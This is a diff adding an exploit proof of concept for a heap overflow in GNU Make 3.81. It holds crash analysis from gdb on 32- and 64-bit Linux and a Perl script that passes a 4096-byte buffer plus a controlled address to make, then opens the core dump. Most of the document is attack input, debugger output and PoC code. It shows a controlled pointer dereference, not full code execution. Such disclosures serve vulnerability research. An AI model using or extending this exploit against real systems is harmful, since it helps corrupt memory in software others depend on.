@@ -1,0 +1,182 @@
+=for comment
+# Exploit Title: MAKE Heap Overflow - Pointer dereferencing POC (Calloc)-X86 X64
+# Date: [14.07.14]
+# Exploit Author: HyP
+# Vendor Homepage: http://www.gnu.org/software/make/
+# Software Link: http://ftp.gnu.org/gnu/make/
+# Version: Make 3.81
+# Tested on: linux32,64 bits (Fedora,Debian,ubuntu,Arch)
+# CVE : none
+
+*******************************************************************************************
+Special Thanks:
+
+kmkz
+Zadyree
+Sec0d Team
+
+*******************************************************************************************
+*******************************************************************************************
+32bits
+
+
+./checksec.sh --file make
+RELRO STACK CANARY NX PIE RPATH
+RUNPATH FILE
+No RELRO No canary found NX enabled No PIE No RPATH
+No RUNPATH make
+
+
+gdb-peda$ r `perl -e 'print "A" x 4000 . "B"x96 . "\xef\xbe\xad\xde"x4'`
+
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+...
+EAX: 0xdeadbeef
+EBX: 0x807b971 --> 0x6f2e ('.o')
+ECX: 0x0
+EDX: 0x1
+ESI: 0xdeadbeef
+EDI: 0x0
+EBP: 0xbfffc5e8 --> 0xbfffc698 --> 0x8081de0 --> 0x0
+ESP: 0xbfffa310 --> 0xbfffb510 --> 0x6f2e ('.o')
+EIP: 0x80548b2 (mov eax,DWORD PTR [eax])
+EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction
+overflow)
+[-------------------------------------code-------------------------------------]
+0x80548aa: je 0x80548b8
+0x80548ac: lea esi,[esi+eiz*1+0x0]
+0x80548b0: mov esi,eax
+=> 0x80548b2: mov eax,DWORD PTR [eax] <------ Pointer Dereferencing
+0x80548b4: test eax,eax
+0x80548b6: jne 0x80548b0
+0x80548b8: cmp DWORD PTR [ebp-0x1034],0x1
+0x80548bf: mov DWORD PTR [ebp-0x10ac],edx
+[------------------------------------stack-------------------------------------]
+0000| 0xbfffa310 --> 0xbfffb510 --> 0x6f2e ('.o')
+0004| 0xbfffa314 --> 0x807b971 --> 0x6f2e ('.o')
+0008| 0xbfffa318 --> 0x2
+0012| 0xbfffa31c --> 0xb7ffadf8 ("symbol=%s; lookup in file=%s [%lu]\n")
+0016| 0xbfffa320 --> 0x0
+0020| 0xbfffa324 --> 0x0
+0024| 0xbfffa328 --> 0x0
+0028| 0xbfffa32c --> 0x0
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x080548b2 in ?? ()
+
+
+Overflow code:
+...
+80548aa: 74 0c je 80548b8 <calloc@plt+0xac38>
+80548ac: 8d 74 26 00 lea 0x0(%esi,%eiz,1),%esi
+80548b0: 89 c6 mov %eax,%esi
+80548b2: 8b 00 mov (%eax),%eax
+80548b4: 85 c0 test %eax,%eax
+80548b6: 75 f8 jne 80548b0 <calloc@plt+0xac30>
+...
+
+
+gdb-peda$ x/x $eax
+0x807ff68: 0x00000000
+
+peda vmmap
+Start End Perm Name
+0x08048000 0x0806f000 r-xp /root/Desktop/RESEARCH/make_BoF/make
+0x0806f000 0x08070000 rw-p /root/Desktop/RESEARCH/make_BoF/make
+
+0x08070000 0x08092000 rw-p [heap] // heap overflow !!
+
+
+
+*******************************************************************************************
+*******************************************************************************************
+64bits
+
+
+Overflow Code :
+40cc59: 74 10 je 40cc6b <__ctype_b_loc@plt+0xa52b>
+40cc5b: 0f 1f 44 00 00 nop DWORD PTR [rax+rax*1+0x0]
+40cc60: 48 89 c3 mov rbx,rax
+40cc63: 48 8b 00 mov rax,QWORD PTR [rax] // heap overflow
+
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+RAX: 0xdeadbeefdeadbeef
+RBX: 0xdeadbeefdeadbeef
+RCX: 0x4242424242424242 ('BBBBBBBB')
+RDX: 0x0
+RSI: 0x7fffffff97d0 ('A' <repeats 200 times>...)
+RDI: 0x7fffffffa7e2 --> 0x732e656c69666500 ('')
+RBP: 0x7fffffffb930 --> 0x1
+RSP: 0x7fffffff95f0 --> 0x0
+RIP: 0x40cc63 (mov rax,QWORD PTR [rax])
+R8 : 0x4242424242424242 ('BBBBBBBB')
+R9 : 0x7ffff7972440 (mov dx,WORD PTR [rsi-0x2])
+R10: 0x4242424242424242 ('BBBBBBBB')
+R11: 0x7ffff799f990 --> 0xfffd28d0fffd2708
+R12: 0x1
+R13: 0x0
+R14: 0x6397a0 --> 0x6f2e25 ('%.o')
+R15: 0x0
+EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction
+overflow)
+[-------------------------------------code-------------------------------------]
+0x40cc59: je 0x40cc6b
+0x40cc5b: nop DWORD PTR [rax+rax*1+0x0]
+0x40cc60: mov rbx,rax
+=> 0x40cc63: mov rax,QWORD PTR [rax] <----- Pointer dereferencing
+0x40cc66: test rax,rax
+0x40cc69: jne 0x40cc60
+0x40cc6b: cmp DWORD PTR [rbp-0x105c],0x1
+0x40cc72: lea rdi,[rbp-0x40]
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffff95f0 --> 0x0
+0008| 0x7fffffff95f8 --> 0x0
+0016| 0x7fffffff9600 --> 0x0
+0024| 0x7fffffff9608 --> 0x645e50 --> 0x646630 --> 0x64667b -->
+0x5f7266006362696c ('libc')
+0032| 0x7fffffff9610 --> 0xffffffdf
+0040| 0x7fffffff9618 --> 0x645e58 --> 0x6462f0 --> 0x64a500 --> 0x64a541
+--> 0x5f726600656b616d ('make')
+0048| 0x7fffffff9620 --> 0x7ffff7bd01f8 --> 0x645e50 --> 0x646630 -->
+0x64667b --> 0x5f7266006362696c ('libc')
+0056| 0x7fffffff9628 --> 0x0
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x000000000040cc63 in ?? ()
+
+
+
+*******************************************************************************************
+*******************************************************************************************
+Proof of Concept - Source code
+*******************************************************************************************
+*******************************************************************************************
+=cut
+
+#!/usr/bin/perl
+
+use 5.010;
+use strict;
+use warnings;
+say "Please set ulimit value to 1000 before (ulimit -c 1000) ";
+sleep 0.5;
+
+
+my $buff = "A"x 4096 ;
+my $addr = "\xef\xbe\xad\xde";
+my $make = "./make";
+my $gdb = "gdb --core core";
+my $PAYLOAD= (`perl -e 'print "$buff" . "$addr" '`);
+
+my $exec= qx($make $PAYLOAD);
+
+say " Reading Core file GDB ";
+sleep 0.5;
+
+system ($gdb);
